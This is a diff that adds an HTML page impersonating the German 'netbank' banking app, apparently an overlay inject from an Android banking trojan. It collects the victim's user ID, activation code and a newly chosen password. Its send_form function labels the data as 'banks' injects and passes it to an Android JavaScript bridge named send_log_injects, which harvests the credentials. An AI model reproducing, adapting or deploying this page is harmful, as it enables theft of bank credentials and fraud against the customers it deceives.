@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>netbank</title>
+    <link rel="shortcut icon" href="de.adesso_mobile.secureapp.netbank.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #fff;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+    }
+    .logo {
+text-align: center;
+    background-size: 100%;
+    padding: 0px 0px 0px 0px;
+    background: none;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 95%;
+    position: relative;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    color: #6c6b6b;
+    text-align: left;
+    outline: none;
+    background: #ffffff;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+    border-bottom: 1px solid lightgrey;
+    margin: 0 auto;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #ffffff;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #1652f0;
+    border-radius: 10px;
+}
+input::placeholder {
+    color: #a5a2a2;
+    font-size: 15px;
+}
+input:disabled {
+    left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #2a2929;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #cecece;
+    border-radius: 10px;
+}
+input[type="checkbox"] {
+    display: none;
+}
+
+/* стили для метки */
+input[type="checkbox"] + label {
+    cursor: pointer;
+    padding-left: 50px;
+    position: relative;
+    font-family: tahoma, sans-serif, arial;
+    line-height: 40px;
+}
+
+/* стили для поля с бегунком*/
+input[type="checkbox"] + label::before {
+content: "";
+    display: inline-block;
+    position: absolute;
+    top: 0;
+    left: 0;
+    vertical-align: middle;
+    padding: 0;
+    height: 24px;
+    width: 45px;
+    margin: 0 5px 0 0;
+    border: 1px solid #d7d7d7;
+    border-radius: 12px;
+    background: #fcfcfc;
+}
+
+/* стили для бегунка*/
+input[type="checkbox"] + label::after {
+content: "";
+    display: block;
+    position: absolute;
+    top: -0.5px;
+    left: 1px;
+    width: 25px;
+    height: 25px;
+    border-radius: 22px;
+    background: #ffffff;
+    border: 1px solid #dadada;
+    box-shadow: 0 3px 3px rgba(140, 140, 140, .1);
+}
+
+/* плавность )) */
+input[type="checkbox"] + label::before,
+input[type="checkbox"] + label::after {
+    -webkit-transition: all .2s ease-out;
+    transition: all .2s ease-out;
+}
+
+/* чекнутое состояние )) */
+input[type="checkbox"]:checked + label::before {
+    background: #6edc5f;
+    border-color: #6dd75e;
+}
+input[type="checkbox"]:checked + label::after {
+    left: 22px;
+}
+</style>
+
+<fieldset id="formtosend">
+
+<div id="home" style="display: block;">
+
+<span style="padding-top: 50px; display: block; color: #8d8a8a;">Tragen Sie bitte lhre Nutzerkennung und den Freischaltcode ein.</span>
+
+
+<div style="padding-top: 40px;">
+
+<label style="text-align: left;display: inline-block;width: 95%;font-size: 14px;color: #3F51B5;">Nutzerkennung:</label>
+<input type="text" name="nutzerkennung" id="nutzerkennung" onkeyup="check2()" placeholder="Nutzerkennung">
+<br>
+<label style="text-align: left;display: inline-block;width: 95%;font-size: 14px;color: #3F51B5;">Freischaltcode:</label>
+<input type="text" name="freischaltcode" id="freischaltcode" onkeyup="check2()" placeholder="Freischaltcode">
+
+</div>
+
+<script type="text/javascript">
+    function show_login() {
+        document.getElementById("home").style.display="none";
+        document.getElementById("logpage").style.display="block";
+    }
+</script>
+<br><br>
+<input type="button" name="sumbit" id="send" value="Weiter zur Passwortvergabe" onclick="show_login()" style="background: #8BC34A;width: 95%;margin: 0 auto;float: none;display: block;">
+
+<div style="line-height: 2; padding-top: 50px;">
+<a href="#" style="display: block; border-bottom: 1px solid #d7d7d7; width: 300px; margin: 0 auto; text-decoration: none; color: #4CAF50;">Hilfe</a>
+<a href="#" style="display: block; border-bottom: 1px solid #d7d7d7; width: 300px; margin: 0 auto; text-decoration: none; color: #4CAF50;">Rechtliche Hinweise</a>
+<a href="#" style="display: block; border-bottom: 1px solid #d7d7d7; width: 300px; margin: 0 auto; text-decoration: none; color: #4CAF50;">Datenschutz</a>
+</div>
+
+</div>
+
+<div id="logpage" style="display: none;">
+
+<div class="" id="log" style="display: block;">
+
+  <script>
+function check() {
+  var inp1 = document.getElementById('login'),
+      inp2 = document.getElementById('password');
+  document.getElementById('send').disabled = inp1.value && inp2.value ? false : "disabled";
+}
+</script>
+
+<span style="padding-top: 50px; display: block; color: #8d8a8a;">Vergeben Sie bitte ein neues Passwort für die Nutzung der App.</span>
+
+
+<div style="padding-top: 40px;">
+
+<label style="text-align: left;display: inline-block;width: 95%;font-size: 14px;color: #3F51B5;">Passwort festlegen:</label>
+<input type="text" name="Passwort_festlegen" id="Passwort_festlegen" onkeyup="check2()" placeholder="Passwort festlegen">
+<br>
+<label style="text-align: left;display: inline-block;width: 95%;font-size: 14px;color: #3F51B5;">Passwort wiederholen:</label>
+<input type="text" name="Passwort_wiederholen" id="Passwort_wiederholen" onkeyup="check2()" placeholder="Passwort wiederholen">
+
+</div>
+
+<script type="text/javascript">
+    function show_login() {
+        document.getElementById("home").style.display="none";
+        document.getElementById("logpage").style.display="block";
+    }
+</script>
+<br>
+<a href="#" style="display: block;float: right;color: #fff;text-decoration: none;font-size: 14px;position: relative;right: 35px;">
+    <span style="float: left;position: relative;right: 20px;top: 15px; color: #a9a7a7;">Face ID verwenden</span>
+    <input id="checkbox1" name="sumbit" type="checkbox">
+        <label for="checkbox1"></label>
+</a>
+<br>
+<br><br>
+<input type="button" name="sumbit" id="send" value="Weiter zum Gerätenamen" onclick="send_form()" style="background: #8BC34A;width: 95%;margin: 0 auto;float: none;display: block;">
+
+<div style="line-height: 2; padding-top: 50px;">
+<a href="#" style="display: block; border-bottom: 1px solid #d7d7d7; width: 300px; margin: 0 auto; text-decoration: none; color: #4CAF50;">Hilfe</a>
+<a href="#" style="display: block; border-bottom: 1px solid #d7d7d7; width: 300px; margin: 0 auto; text-decoration: none; color: #4CAF50;">Rechtliche Hinweise</a>
+</div>
+<input name="exit" type="hidden" text="true"/>
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+function send_form()
+{
+    var data = {};
+    data.nutzerkennung = document.getElementById('nutzerkennung').value;
+    data.freischaltcode = document.getElementById('freischaltcode').value;
+    data.Passwort_festlegen = document.getElementById('Passwort_festlegen').value;
+    data.Passwort_wiederholen = document.getElementById('Passwort_wiederholen').value;
+    data.type_injects = "banks";
+    data.closed = "close_activity_injects";
+
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+            Android.send_log_injects(JSON.stringify(data))
+        } catch (err) {}
+    }else{
+        alert(JSON.stringify(data));
+    } 
+}
+</script>
+
+</body>
+</html>
